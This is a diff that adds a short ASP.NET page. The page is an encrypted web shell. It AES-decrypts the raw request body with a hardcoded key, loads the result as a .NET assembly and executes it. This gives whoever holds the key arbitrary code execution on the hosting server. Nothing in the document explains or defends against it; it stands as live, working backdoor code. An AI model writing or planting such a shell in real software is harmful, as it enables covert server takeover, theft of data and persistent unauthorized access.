@@ -1,0 +1,5 @@
+<%@ Page Language="C#" %>
+<%@Import Namespace="System.Reflection"%>
+<%Server.ClearError();if(Session["k"] == null){Session.Add("k", "4c357fc49afdf782");}
+byte[] k = Encoding.Default.GetBytes(Session["k"] + ""), c = Request.BinaryRead(Request.ContentLength);
+Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
